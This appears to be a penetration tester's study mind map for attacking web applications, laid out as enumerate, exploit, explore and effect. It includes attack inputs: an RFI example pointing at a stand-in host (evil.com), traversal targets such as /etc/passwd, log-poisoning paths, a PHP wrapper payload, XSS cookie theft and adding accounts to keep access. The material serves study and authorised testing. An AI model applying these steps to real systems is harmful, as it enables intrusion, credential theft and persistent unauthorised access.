# Mind Map - Web Apps
## Enumerate 
* Enumerate the following before attempting to exploit a web app:
  * Programming language and/or web development framework in use
  * Web server software in use
  * Database software in use
  * Server operating system in use
* URLs
  * Filetype extensions (don't forget, modern web apps might use routes instead)
* Web Page Source Code
  * Comments
  * Hidden form fields
* Response Headers
  * Server header
  * "X-" headers
* Site Maps
  * robots.txt
  * sitemap.xml
* Admin Consoles
  * MySQL
    * Tomcat:
      * Path: /manager/html
    * phpMyAdmin:
      * Path: /phpmyadmin
      * Configuration file: config.inc.php

## Exploit
* Admin Consoles
  * Attempt to login using default credentials
  * Attempt to login using credentials found elsewhere (shares: SMB, NFS, etc.)
  * Use Burp Proxy to confirm which parameters are required to submit a valid HTTP request (cookie, session, password, token, etc.)
  * Use Burp Intruder to set the parameters required to submit a valid HTTP request
* XSS
  * Check if special characters are sanitized: <, >, {, }, ', ", ;
  * Check if HTML encoded special characters are sanitized  
  * Check if URL (Percent) encoded special characters are sanitized
  * Attempt a XSS attack 
    * Redirect a victim to a staged, information gathering script (HTML iframes)
    * Steal cookies and use them to negate having to authenticate to an Admin Console (JavaScript)
* Directory Traversal
  * Find references to files and change the value to something else. 
  * Look for file extensions in URLs. 
  * If you find a viable attack vector, try files accessible by all users (try the paths using encoding too; consider null characters to terminate file paths on older versions of PHP).
    * Windows:
      * C:\boot.ini
      * C:\Windows\System32\Drivers\etc\hosts
    * Linux:
      * /etc/passwd 
  * If you're able to access the web app's configuration files (ex: php.ini), you might be able to find credentials or determine if File Inclusions are allowed. 
    * Variables to check in the php.ini configuration file. 
      * register_globals: ???
      * allow_url: on 
* File Inclusions
  * Use the same techniques for identifying Directory Traversal vulnerabilities to find LFIs. 
  * For RFIs, try different ports to ensure firewalls are not a problem (ex: index.php?file=http://evil.com:443). 
  * For RFIs, try null characters to terminate file paths (necessary when dealing with older versions of PHP).
  * For RFIs, try ending your RFI paylods with ? so they're digested as part of the query string by the web server. 
  * If you can't upload files to perform an LFI, try log poisoning. You need to know the following:
    * File path for HTTP access log
        * /var/log/apache/access.log
        * /var/log/apache2/access.log
        * /var/log/httpd/access.log
    * Parameter to use (ex: file=, page=, cmd=)
  * For LFIs, try PHP protocol wrappers (file=data:text/plain,<php? echo 'foo' ?>)
* SQL Injection
  * Identify attack vectors and enumerate the underlying technology stack using single-quotes (single-quotes to delimit SQL strings) 

## Explore
* Admin Consoles
  * Explore accessible databases
    * Determine their design (tables, columns, rows)
    * Read their contents

## Effect
* Admin Consoles
  * Add accounts to maintain access 
